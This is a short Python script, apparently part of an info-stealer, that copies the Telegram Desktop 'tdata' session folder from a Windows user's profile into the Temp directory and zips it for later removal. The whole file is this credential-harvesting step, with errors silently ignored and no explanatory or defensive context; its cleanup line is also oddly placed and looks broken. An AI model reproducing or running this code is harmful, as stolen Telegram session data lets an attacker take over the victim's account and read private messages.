import os, os.path, shutil

user = os.path.expanduser("~")


def telegram():
  if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
   try:
    shutil.copytree(user+'\\AppData\\Roaming\\Telegram Desktop\\tdata', user+'\\AppData\\Local\\Temp\\tdata_session')
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\tdata_session', 'zip', user+'\\AppData\\Local\\Temp\\tdata_session')
   except:
    pass
    os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")

telegram()
